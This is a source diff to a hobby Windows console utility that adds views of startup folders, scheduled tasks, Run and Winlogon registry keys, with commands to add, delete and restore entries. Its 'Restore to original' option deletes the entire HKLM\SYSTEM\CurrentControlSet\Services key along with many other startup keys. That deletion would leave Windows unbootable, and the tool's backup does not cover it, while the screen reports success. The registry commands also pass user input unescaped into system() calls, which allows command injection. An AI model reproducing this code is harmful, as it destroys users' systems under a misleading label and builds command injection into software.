@@ -17,6 +17,8 @@
 #include <chrono>
 #include <thread>
 #include <map>
+#include <fstream>
+#include <ctime>
 #include "terminal_commands.h"
 
 
@@ -56,6 +58,18 @@ void browseDirectory(const string& path);
 void showFileInfo(const FileInfo& file);
 void showFileManagement(const FileInfo& file);
 void customTerminal();
+void showStartupLocationsMenu();
+void checkStartupFolder();
+void checkTaskScheduler();
+void checkRegistryStartup();
+void checkShellUserinit();
+void restoreStartupSettings();
+
+// Logging functions
+void writeLog(const string& message);
+string getCurrentTimestamp();
+void createBackup();
+void restoreFromBackup();
 
 void gotoxy(int x, int y) {
     COORD coord;
@@ -99,9 +113,14 @@ void showHelp() {
     cout << "      - 'S' to search for files on the computer" << endl << endl;
 
     cout << "   System Tools:" << endl;
-    cout << "       - Check various startup locations" << endl;
-    cout << "       - Options include Startup Folder, Task Scheduler, Registry, Shell, and Userinit" << endl;
-    cout << "       - Option to reset startup parameters to default values" << endl << endl;
+    cout << "       - Check Startup Locations: Interactive examination of startup locations with management commands" << endl;
+    cout << "         * Startup Folders: View and open startup folders" << endl;
+    cout << "         * Registry: View, add, and delete registry startup entries" << endl;
+    cout << "         * Task Scheduler: View and manage scheduled startup tasks" << endl;
+    cout << "         * Shell/Userinit: Check and restore critical system values" << endl;
+    cout << "       - Clear TEMP Files: Remove temporary files to free up disk space" << endl;
+    cout << "       - System Info: Display system information" << endl;
+    cout << "       - Users: List system users" << endl << endl;
 
     cout << "   Key Bindings:" << endl;
     cout << "       - Up Arrow: Move selection up" << endl;
@@ -154,7 +173,7 @@ void drawMenu(const vector<string>& menuItems, int selectedIndex) {
         cout << "-";
     }
 
-    cout << "Version: 8.1.2 | Created by: LCKY |GitHub: https://github.com/lackyhy/7SCW" << endl;
+    cout << "Version: 8.1.8 | Created by: LCKY |GitHub: https://github.com/lackyhy/7SCW" << endl;
 
     for(int i = 0; i < consoleWidth; ++i) {
         cout << "-";
@@ -1163,10 +1182,12 @@ void showAdditionalOperations(const string& currentPath) {
     vector<string> options = {
         "Create New Folder",
         "Create New File",
+        "===================",
         "Copy Selected",
         "Move Selected",
         "Delete Selected",
         "Rename Selected",
+        "===================",
         "Back"
     };
     int selectedIndex = 0;
@@ -1177,8 +1198,14 @@ void showAdditionalOperations(const string& currentPath) {
         cout << "Additional Operations" << endl << endl;
 
         for (int i = 0; i < options.size(); i++) {
+            // Skip separators when selecting
+            if (options[i] == "===================") {
+                cout << " " << options[i] << endl;
+                continue;
+            }
+            
             if (i == selectedIndex) {
-                cout << "> ";
+                cout << ">";
             }
             else {
                 cout << "  ";
@@ -1191,10 +1218,14 @@ void showAdditionalOperations(const string& currentPath) {
             key = _getch();
             switch (key) {
             case 72: // Up arrow
-                selectedIndex = (selectedIndex - 1 + options.size()) % options.size();
+                do {
+                    selectedIndex = (selectedIndex - 1 + options.size()) % options.size();
+                } while (options[selectedIndex] == "===================");
                 break;
             case 80: // Down arrow
-                selectedIndex = (selectedIndex + 1) % options.size();
+                do {
+                    selectedIndex = (selectedIndex + 1) % options.size();
+                } while (options[selectedIndex] == "===================");
                 break;
             }
         }
@@ -1206,19 +1237,19 @@ void showAdditionalOperations(const string& currentPath) {
             case 1: // Create New File
                 createNewFile(currentPath);
                 break;
-            case 2: // Copy Selected
+            case 3: // Copy Selected
                 // TODO: Implement copy functionality
                 break;
-            case 3: // Move Selected
+            case 4: // Move Selected
                 // TODO: Implement move functionality
                 break;
-            case 4: // Delete Selected
+            case 5: // Delete Selected
                 // TODO: Implement delete functionality
                 break;
-            case 5: // Rename Selected
+            case 6: // Rename Selected
                 // TODO: Implement rename functionality
                 break;
-            case 6: // Back
+            case 8: // Back
                 running = false;
                 break;
             }
@@ -1800,6 +1831,7 @@ int main() {
         "Users\n",
         "Clear TEMP Files",
         "System Info\n",
+        "Check Startup Locations\n", // Add this new menu item
         "CMD",
         "POWERSHELL\n",
         "Help",
@@ -1899,20 +1931,23 @@ int main() {
                 cout << "\nPress any key to continue...";
                     _getch();
                 break;
-            case 4: // CMD
+            case 4: // Check Startup Locations
+                showStartupLocationsMenu();
+                break;
+            case 5: // CMD
                 system("cls");
                 system("cmd");
                 _getch();
                 break;
-            case 5: // POWERSHELL
+            case 6: // POWERSHELL
                 system("cls");
                 system("powershell");
                 _getch();
                 break;
-            case 6: // Help
+            case 7: // Help
                 showHelp();
                 break;
-            case 7: // Exit
+            case 8: // Exit
                 running = false;
                 break;
             }
@@ -1927,4 +1962,652 @@ int main() {
 
     showCursor();
     return 0;
+}
+
+void showStartupLocationsMenu() {
+    vector<string> options = {
+        "Startup Folder",
+        "Task Scheduler", 
+        "Registry",
+        "Shell/Userinit",
+        "===================",
+        "Restore to original",
+        "===================",
+        "Back to Main Menu"
+    };
+    int selectedIndex = 0;
+    bool running = true;
+
+    while (running) {
+        system("cls");
+        cout << "Check Startup Locations" << endl;
+        cout << "Use Up and Down arrows to navigate, Enter to select, 'q' to quit" << endl << endl;
+
+        for (int i = 0; i < options.size(); i++) {
+            // Skip separators when selecting
+            if (options[i] == "===================") {
+                cout << " " << options[i] << endl;
+                continue;
+            }
+            
+            if (i == selectedIndex) {
+                cout << ">";
+            }
+            else {
+                cout << "   ";
+            }
+            
+            // Set color for "Restore to original" option
+            if (options[i] == "Restore to original") {
+                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
+                cout << options[i] << endl;
+                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
+            } else {
+                cout << options[i] << endl;
+            }
+        }
+
+        int key = _getch();
+        if (g_ctrlCPressed) {
+            g_ctrlCPressed = FALSE;
+            running = false;
+            continue;
+        }
+        if (key == 224) {
+            key = _getch();
+            switch (key) {
+            case 72: // Up arrow
+                do {
+                    selectedIndex = (selectedIndex - 1 + options.size()) % options.size();
+                } while (options[selectedIndex] == "===================");
+                break;
+            case 80: // Down arrow
+                do {
+                    selectedIndex = (selectedIndex + 1) % options.size();
+                } while (options[selectedIndex] == "===================");
+                break;
+            }
+        }
+        else if (key == 13) { // Enter
+            switch (selectedIndex) {
+            case 0: // Startup Folder
+                checkStartupFolder();
+                break;
+            case 1: // Task Scheduler
+                checkTaskScheduler();
+                break;
+            case 2: // Registry
+                checkRegistryStartup();
+                break;
+            case 3: // Shell/Userinit
+                checkShellUserinit();
+                break;
+            case 5: // Restore to original
+                restoreStartupSettings();
+                break;
+            case 7: // Back to Main Menu
+                running = false;
+                break;
+            }
+        }
+        else if (key == 'q' || key == 'Q') {
+            running = false;
+        }
+    }
+}
+
+void checkStartupFolder() {
+    system("cls");
+    cout << "========================================" << endl;
+    cout << "   Startup Folder Check" << endl;
+    cout << "========================================" << endl << endl;
+
+    cout << "Checking Startup Folders..." << endl << endl;
+    writeLog("User accessed Startup Folder check");
+
+    // Current User Startup Folder
+    cout << "Current User Startup Folder:" << endl;
+    cout << "-----------------------------" << endl;
+    char appDataPath[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
+        string startupPath = string(appDataPath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+        if (GetFileAttributesA(startupPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            cout << "✓ Found: " << startupPath << endl << endl;
+            cout << "Contents:" << endl;
+            
+            WIN32_FIND_DATAA findData;
+            HANDLE hFind = FindFirstFileA((startupPath + "\\*").c_str(), &findData);
+            if (hFind != INVALID_HANDLE_VALUE) {
+                bool hasFiles = false;
+                do {
+                    if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
+                        cout << "  " << findData.cFileName << endl;
+                        hasFiles = true;
+                    }
+                } while (FindNextFileA(hFind, &findData));
+                FindClose(hFind);
+                if (!hasFiles) {
+                    cout << "  (Empty)" << endl;
+                }
+            }
+        } else {
+            cout << "✗ Not found: " << startupPath << endl;
+        }
+    }
+
+    cout << endl;
+
+    // All Users Startup Folder
+    cout << "All Users Startup Folder:" << endl;
+    cout << "-------------------------" << endl;
+    char programDataPath[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath) == S_OK) {
+        string commonStartupPath = string(programDataPath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+        if (GetFileAttributesA(commonStartupPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            cout << "✓ Found: " << commonStartupPath << endl << endl;
+            cout << "Contents:" << endl;
+            
+            WIN32_FIND_DATAA findData;
+            HANDLE hFind = FindFirstFileA((commonStartupPath + "\\*").c_str(), &findData);
+            if (hFind != INVALID_HANDLE_VALUE) {
+                bool hasFiles = false;
+                do {
+                    if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
+                        cout << "  " << findData.cFileName << endl;
+                        hasFiles = true;
+                    }
+                } while (FindNextFileA(hFind, &findData));
+                FindClose(hFind);
+                if (!hasFiles) {
+                    cout << "  (Empty)" << endl;
+                }
+            }
+        } else {
+            cout << "✗ Not found: " << commonStartupPath << endl;
+        }
+    }
+
+    cout << endl;
+    cout << "------------------------------------------------------------------------------------------------------------------------" << endl;
+    cout << "Commands:" << endl;
+    cout << "open_user_startup    - Open current user startup folder" << endl;
+    cout << "open_all_startup     - Open all users startup folder" << endl;
+    cout << "q (back)" << endl;
+    cout << "Enter command: ";
+
+    string command;
+    getline(cin, command);
+
+    if (command == "q" || command == "Q") {
+        return;
+    }
+    else if (command == "open_user_startup") {
+        char appDataPath[MAX_PATH];
+        if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
+            string startupPath = string(appDataPath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+            ShellExecuteA(NULL, "explore", startupPath.c_str(), NULL, NULL, SW_SHOW);
+            cout << "Opened user startup folder" << endl;
+        }
+    }
+    else if (command == "open_all_startup") {
+        char programDataPath[MAX_PATH];
+        if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath) == S_OK) {
+            string commonStartupPath = string(programDataPath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+            ShellExecuteA(NULL, "explore", commonStartupPath.c_str(), NULL, NULL, SW_SHOW);
+            cout << "Opened all users startup folder" << endl;
+        }
+    }
+    else if (!command.empty()) {
+        cout << "Unknown command. Available commands:" << endl;
+        cout << "open_user_startup    - Open current user startup folder" << endl;
+        cout << "open_all_startup     - Open all users startup folder" << endl;
+        cout << "q (back)" << endl;
+    }
+
+    cout << endl << "Press any key to continue...";
+    _getch();
+}
+
+void checkTaskScheduler() {
+    system("cls");
+    cout << "========================================" << endl;
+    cout << "   Task Scheduler Check" << endl;
+    cout << "========================================" << endl << endl;
+
+    cout << "Checking Task Scheduler Startup Tasks..." << endl << endl;
+
+    cout << "Tasks with 'startup' in name:" << endl;
+    cout << "-----------------------------" << endl;
+    system("schtasks /query /fo table /tn \"*startup*\" 2>nul");
+    
+    cout << endl;
+    cout << "Tasks that run at logon:" << endl;
+    cout << "------------------------" << endl;
+    system("schtasks /query /fo table /tn \"*logon*\" 2>nul");
+
+    cout << endl;
+    cout << "All scheduled tasks (brief list):" << endl;
+    cout << "---------------------------------" << endl;
+    system("schtasks /query /fo table 2>nul | findstr /i startup");
+
+    cout << endl;
+    cout << "------------------------------------------------------------------------------------------------------------------------" << endl;
+    cout << "Commands:" << endl;
+    cout << "open_taskschd        - Open Task Scheduler MMC" << endl;
+    cout << "list_all_tasks       - List all scheduled tasks" << endl;
+    cout << "q (back)" << endl;
+    cout << "Enter command: ";
+
+    string command;
+    getline(cin, command);
+
+    if (command == "q" || command == "Q") {
+        return;
+    }
+    else if (command == "open_taskschd") {
+        system("taskschd.msc");
+        cout << "Opened Task Scheduler" << endl;
+    }
+    else if (command == "list_all_tasks") {
+        system("cls");
+        cout << "All Scheduled Tasks:" << endl;
+        cout << "====================" << endl << endl;
+        system("schtasks /query /fo table 2>nul");
+        cout << endl << "Press any key to continue...";
+        _getch();
+        return;
+    }
+    else if (!command.empty()) {
+        cout << "Unknown command. Available commands:" << endl;
+        cout << "open_taskschd        - Open Task Scheduler MMC" << endl;
+        cout << "list_all_tasks       - List all scheduled tasks" << endl;
+        cout << "q (back)" << endl;
+    }
+
+    cout << endl << "Press any key to continue...";
+    _getch();
+}
+
+void checkRegistryStartup() {
+    system("cls");
+    cout << "========================================" << endl;
+    cout << "   Registry Startup Check" << endl;
+    cout << "========================================" << endl << endl;
+
+    cout << "Checking Registry Startup Locations..." << endl << endl;
+    cout << "Current Registry Entries:" << endl << endl;
+    writeLog("User accessed Registry Startup check");
+
+    // Check HKCU Run
+    cout << "Checking: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" << endl;
+    system("reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>nul");
+    cout << endl;
+
+    // Check HKCU RunOnce
+    cout << "Checking: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" << endl;
+    system("reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" 2>nul");
+    cout << endl;
+
+    // Check HKLM Run
+    cout << "Checking: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" << endl;
+    system("reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>nul");
+    cout << endl;
+
+    // Check HKLM RunOnce
+    cout << "Checking: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" << endl;
+    system("reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" 2>nul");
+    cout << endl;
+
+    cout << "------------------------------------------------------------------------------------------------------------------------" << endl;
+    cout << "Commands:" << endl;
+    cout << "addhkcu_run <name> <value>" << endl;
+    cout << "addhklm_run <name> <value>" << endl;
+    cout << "deletehkcu_run <name>" << endl;
+    cout << "deletehklm_run <name>" << endl;
+    cout << "q (back)" << endl;
+    cout << "Enter command: ";
+
+    string command;
+    getline(cin, command);
+
+    if (command == "q" || command == "Q") {
+        return;
+    }
+
+    // Parse and execute commands
+    stringstream ss(command);
+    string cmd, name, value;
+    ss >> cmd;
+
+    if (cmd == "addhkcu_run") {
+        ss >> name;
+        getline(ss, value);
+        if (!name.empty() && !value.empty()) {
+            string regCommand = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" + name + "\" /t REG_SZ /d \"" + value + "\" /f";
+            system(regCommand.c_str());
+            cout << "Added to HKCU Run: " << name << endl;
+            writeLog("Added registry entry HKCU Run: " + name + " = " + value);
+        } else {
+            cout << "Usage: addhkcu_run <name> <value>" << endl;
+        }
+    }
+    else if (cmd == "addhklm_run") {
+        ss >> name;
+        getline(ss, value);
+        if (!name.empty() && !value.empty()) {
+            string regCommand = "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" + name + "\" /t REG_SZ /d \"" + value + "\" /f";
+            system(regCommand.c_str());
+            cout << "Added to HKLM Run: " << name << endl;
+            writeLog("Added registry entry HKLM Run: " + name + " = " + value);
+        } else {
+            cout << "Usage: addhklm_run <name> <value>" << endl;
+        }
+    }
+    else if (cmd == "deletehkcu_run") {
+        ss >> name;
+        if (!name.empty()) {
+            string regCommand = "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" + name + "\" /f";
+            system(regCommand.c_str());
+            cout << "Deleted from HKCU Run: " << name << endl;
+            writeLog("Deleted registry entry HKCU Run: " + name);
+        } else {
+            cout << "Usage: deletehkcu_run <name>" << endl;
+        }
+    }
+    else if (cmd == "deletehklm_run") {
+        ss >> name;
+        if (!name.empty()) {
+            string regCommand = "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" + name + "\" /f";
+            system(regCommand.c_str());
+            cout << "Deleted from HKLM Run: " << name << endl;
+            writeLog("Deleted registry entry HKLM Run: " + name);
+        } else {
+            cout << "Usage: deletehklm_run <name>" << endl;
+        }
+    }
+    else if (!command.empty()) {
+        cout << "Unknown command. Available commands:" << endl;
+        cout << "addhkcu_run <name> <value>" << endl;
+        cout << "addhklm_run <name> <value>" << endl;
+        cout << "deletehkcu_run <name>" << endl;
+        cout << "deletehklm_run <name>" << endl;
+        cout << "q (back)" << endl;
+    }
+
+    cout << endl << "Press any key to continue...";
+    _getch();
+}
+
+void checkShellUserinit() {
+    system("cls");
+    cout << "========================================" << endl;
+    cout << "   Shell/Userinit Check" << endl;
+    cout << "========================================" << endl << endl;
+
+    cout << "Checking Shell and Userinit Registry Values..." << endl << endl;
+
+    cout << "Shell value (should be explorer.exe):" << endl;
+    cout << "--------------------------------------" << endl;
+    system("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell 2>nul");
+
+    cout << endl;
+    cout << "Userinit value (should be userinit.exe,):" << endl;
+    cout << "------------------------------------------" << endl;
+    system("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit 2>nul");
+
+    cout << endl;
+    cout << "ShellExecuteHooks (potential malware location):" << endl;
+    cout << "-----------------------------------------------" << endl;
+    system("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellExecuteHooks\" 2>nul");
+
+    cout << endl;
+    cout << "Additional Winlogon values:" << endl;
+    cout << "---------------------------" << endl;
+    system("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell 2>nul");
+    system("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit 2>nul");
+    system("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Taskman 2>nul");
+
+    cout << endl;
+    cout << "------------------------------------------------------------------------------------------------------------------------" << endl;
+    cout << "Commands:" << endl;
+    cout << "restore_shell        - Restore Shell to explorer.exe" << endl;
+    cout << "restore_userinit     - Restore Userinit to userinit.exe," << endl;
+    cout << "check_malware        - Check for suspicious values" << endl;
+    cout << "q (back)" << endl;
+    cout << "Enter command: ";
+
+    string command;
+    getline(cin, command);
+
+    if (command == "q" || command == "Q") {
+        return;
+    }
+    else if (command == "restore_shell") {
+        cout << "Restoring Shell to default value..." << endl;
+        system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d explorer.exe /f");
+        cout << "Shell restored to explorer.exe" << endl;
+    }
+    else if (command == "restore_userinit") {
+        cout << "Restoring Userinit to default value..." << endl;
+        system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d userinit.exe, /f");
+        cout << "Userinit restored to userinit.exe," << endl;
+    }
+    else if (command == "check_malware") {
+        cout << "Checking for suspicious values..." << endl;
+        cout << "Looking for non-standard Shell values:" << endl;
+        system("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell 2>nul | findstr /v explorer.exe");
+        cout << endl << "Looking for non-standard Userinit values:" << endl;
+        system("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit 2>nul | findstr /v userinit.exe");
+    }
+    else if (!command.empty()) {
+        cout << "Unknown command. Available commands:" << endl;
+        cout << "restore_shell        - Restore Shell to explorer.exe" << endl;
+        cout << "restore_userinit     - Restore Userinit to userinit.exe," << endl;
+        cout << "check_malware        - Check for suspicious values" << endl;
+        cout << "q (back)" << endl;
+    }
+
+    cout << endl << "Press any key to continue...";
+    _getch();
+}
+
+string getCurrentTimestamp() {
+    auto now = chrono::system_clock::now();
+    auto time_t = chrono::system_clock::to_time_t(now);
+    auto tm = *localtime(&time_t);
+    
+    char buffer[100];
+    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &tm);
+    return string(buffer);
+}
+
+void writeLog(const string& message) {
+    ofstream logFile("startup_restore.log", ios::app);
+    if (logFile.is_open()) {
+        logFile << "[" << getCurrentTimestamp() << "] " << message << endl;
+        logFile.close();
+    }
+}
+
+void createBackup() {
+    writeLog("Creating backup of current startup settings...");
+    
+    // Create backup directory
+    system("mkdir backup_startup 2>nul");
+    
+    // Backup registry entries
+    system("reg export \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" backup_startup\\hkcu_run.reg /y >nul 2>&1");
+    system("reg export \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" backup_startup\\hklm_run.reg /y >nul 2>&1");
+    system("reg export \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" backup_startup\\winlogon.reg /y >nul 2>&1");
+    
+    // Backup startup folders
+    char appDataPath[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
+        string startupPath = string(appDataPath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+        string backupCmd = "xcopy \"" + startupPath + "\" backup_startup\\user_startup\\ /E /I /Y >nul 2>&1";
+        system(backupCmd.c_str());
+    }
+    
+    char programDataPath[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath) == S_OK) {
+        string commonStartupPath = string(programDataPath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+        string backupCmd = "xcopy \"" + commonStartupPath + "\" backup_startup\\all_startup\\ /E /I /Y >nul 2>&1";
+        system(backupCmd.c_str());
+    }
+    
+    writeLog("Backup completed successfully");
+}
+
+void restoreFromBackup() {
+    writeLog("Restoring from backup...");
+    
+    if (GetFileAttributesA("backup_startup") == INVALID_FILE_ATTRIBUTES) {
+        writeLog("ERROR: No backup found!");
+        return;
+    }
+    
+    // Restore registry entries
+    system("reg import backup_startup\\hkcu_run.reg >nul 2>&1");
+    system("reg import backup_startup\\hklm_run.reg >nul 2>&1");
+    system("reg import backup_startup\\winlogon.reg >nul 2>&1");
+    
+    writeLog("Registry entries restored from backup");
+}
+
+void restoreStartupSettings() {
+    system("cls");
+    cout << "========================================" << endl;
+    cout << "   Restore to Original" << endl;
+    cout << "========================================" << endl << endl;
+
+    cout << "This will restore startup settings to their original state." << endl;
+    cout << "WARNING: This may affect system startup behavior!" << endl << endl;
+    
+    cout << "Options:" << endl;
+    cout << "1. Create backup and CLEAR ALL startup entries" << endl;
+    cout << "2. Restore from existing backup" << endl;
+    cout << "3. View restore log" << endl;
+    cout << "4. Back" << endl << endl;
+    
+    cout << "Enter choice (1-4): ";
+    char choice = _getch();
+    cout << endl << endl;
+
+    if (choice == '1') {
+        cout << "Creating backup of current settings..." << endl;
+        createBackup();
+        
+        cout << "CLEARING ALL startup entries..." << endl << endl;
+        writeLog("Starting complete startup cleanup");
+        
+        // Clear startup folders
+        cout << "Clearing startup folders..." << endl;
+        char appDataPath[MAX_PATH];
+        if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
+            string startupPath = string(appDataPath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+            string clearCmd = "del /Q \"" + startupPath + "\\*\" >nul 2>&1";
+            system(clearCmd.c_str());
+            writeLog("Cleared user startup folder: " + startupPath);
+        }
+        
+        char programDataPath[MAX_PATH];
+        if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath) == S_OK) {
+            string commonStartupPath = string(programDataPath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+            string clearCmd = "del /Q \"" + commonStartupPath + "\\*\" >nul 2>&1";
+            system(clearCmd.c_str());
+            writeLog("Cleared all users startup folder: " + commonStartupPath);
+        }
+        
+        // Restore default registry values
+        cout << "Restoring default registry values..." << endl;
+        system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d explorer.exe /f >nul 2>&1");
+        system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d userinit.exe, /f >nul 2>&1");
+        writeLog("Restored default Shell and Userinit values");
+        
+        // Clear ALL registry startup entries
+        cout << "Clearing ALL registry startup entries..." << endl;
+        system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /f >nul 2>&1");
+        system("reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /f >nul 2>&1");
+        system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /f >nul 2>&1");
+        system("reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /f >nul 2>&1");
+        system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /f >nul 2>&1");
+        system("reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /f >nul 2>&1");
+        system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /f >nul 2>&1");
+        system("reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /f >nul 2>&1");
+        writeLog("Cleared ALL Run registry entries (Run, RunOnce, RunServices, RunServicesOnce)");
+        
+        // Clear ShellExecuteHooks and other startup locations
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellExecuteHooks\" /f >nul 2>&1");
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler\" /f >nul 2>&1");
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\" /f >nul 2>&1");
+        writeLog("Cleared ShellExecuteHooks, SharedTaskScheduler, and Browser Helper Objects");
+        
+        // Clear additional startup locations
+        cout << "Clearing additional startup locations..." << endl;
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /f >nul 2>&1");
+        system("reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /f >nul 2>&1");
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /f >nul 2>&1");
+        system("reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /f >nul 2>&1");
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run32\" /f >nul 2>&1");
+        system("reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run32\" /f >nul 2>&1");
+        writeLog("Cleared additional startup locations (Policies, StartupApproved)");
+        
+        // Clear Task Scheduler startup tasks
+        cout << "Clearing Task Scheduler startup tasks..." << endl;
+        system("schtasks /delete /tn \"*startup*\" /f >nul 2>&1");
+        system("schtasks /delete /tn \"*logon*\" /f >nul 2>&1");
+        system("schtasks /delete /tn \"*boot*\" /f >nul 2>&1");
+        writeLog("Cleared Task Scheduler startup, logon, and boot tasks");
+        
+        // Clear Winlogon additional values
+        cout << "Clearing Winlogon additional values..." << endl;
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Taskman /f >nul 2>&1");
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AppSetup /f >nul 2>&1");
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v System /f >nul 2>&1");
+        writeLog("Cleared additional Winlogon values (Taskman, AppSetup, System)");
+        
+        // Clear services startup
+        cout << "Clearing services startup entries..." << endl;
+        system("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\" /f >nul 2>&1");
+        writeLog("Cleared services startup entries");
+        
+        // Clear additional startup locations
+        cout << "Clearing additional startup locations..." << endl;
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\StartupFolder\" /f >nul 2>&1");
+        system("reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\StartupFolder\" /f >nul 2>&1");
+        system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\StartupFolderCommon\" /f >nul 2>&1");
+        system("reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\StartupFolderCommon\" /f >nul 2>&1");
+        writeLog("Cleared StartupApproved folder entries");
+        
+        cout << endl << "ALL startup entries cleared successfully!" << endl;
+        writeLog("Complete startup cleanup completed successfully");
+        
+    } else if (choice == '2') {
+        cout << "Restoring from backup..." << endl;
+        restoreFromBackup();
+        cout << "Restore from backup completed!" << endl;
+        
+    } else if (choice == '3') {
+        system("cls");
+        cout << "========================================" << endl;
+        cout << "   Restore Log" << endl;
+        cout << "========================================" << endl << endl;
+        
+        ifstream logFile("startup_restore.log");
